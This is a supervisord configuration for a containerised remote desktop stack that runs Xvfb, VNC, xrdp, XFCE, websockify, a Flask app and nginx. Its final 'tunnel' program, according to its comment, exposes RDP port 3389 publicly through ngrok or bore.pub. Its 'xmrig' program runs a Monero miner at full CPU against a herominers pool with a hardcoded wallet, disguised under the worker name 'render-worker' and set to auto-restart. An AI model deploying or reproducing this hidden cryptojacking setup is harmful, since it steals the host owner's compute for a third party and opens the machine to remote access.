[supervisord]
nodaemon=true
user=root
logfile=/dev/null
logfile_maxbytes=0
pidfile=/run/supervisord.pid
loglevel=info

[unix_http_server]
file=/run/supervisor.sock

[supervisorctl]
serverurl=unix:///run/supervisor.sock

[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface

[program:xvfb]
command=Xvfb :0 -screen 0 %(ENV_RESOLUTION)s -ac +extension GLX +render -noreset -nolisten tcp
autorestart=true
startretries=10
priority=100
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:x11vnc]
command=/usr/local/bin/start-x11vnc.sh
autorestart=true
startretries=10
priority=200
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:xrdp]
command=/usr/local/bin/start-xrdp.sh
autorestart=true
startretries=10
priority=250
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:xfce]
command=/usr/local/bin/start-xfce.sh
user=root
environment=DISPLAY=":0",HOME="/home/desktopuser",USER="root",SHELL="/bin/bash"
autorestart=true
startretries=10
stopasgroup=true
killasgroup=true
priority=300
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:websockify]
command=websockify 127.0.0.1:6080 127.0.0.1:5900
autorestart=true
startretries=10
priority=400
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:rdpws]
command=/opt/venv/bin/python3 /usr/local/bin/rdpws.py
autorestart=true
startretries=10
priority=420
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:flask]
command=/usr/local/bin/start-web.sh
directory=/
environment=PYTHONPATH="/"
autorestart=true
startretries=10
priority=450
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:nginx]
command=/usr/local/bin/start-nginx.sh
autorestart=true
startretries=10
priority=500
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

; Exposes xrdp (3389) on the internet: ngrok when NGROK_AUTHTOKEN is set,
; otherwise the public bore.pub relay. Writes the public address to
; /run/rdp-tunnel.txt (also served by GET /rdp).
[program:tunnel]
command=/usr/local/bin/start-tunnel.sh
autorestart=true
startretries=20
stopasgroup=true
killasgroup=true
priority=550
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:xmrig]
command=/bin/bash -lc 'cd /home/desktopuser/xmrig-6.26.0 && exec ./xmrig -o de.monero.herominers.com:1111 -u 47cZktvBCtVGLMah2BCoDKEsa53Gsnchz4156zLCEG4k6g5Y4mkh9XdGZ372z6Spyj8B3dFBHm285AGxe5f7ZWBrE3mzwjD -p render-worker -a rx/0 --threads=100%% --huge-pages --randomx-1gb-pages --cpu-priority=5 --cpu-no-yield'
directory=/home/desktopuser/xmrig-6.26.0
user=desktopuser
environment=HOME="/home/desktopuser",USER="desktopuser",SHELL="/bin/bash"
autorestart=true
startretries=20
startsecs=5
stopasgroup=true
killasgroup=true
priority=600
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
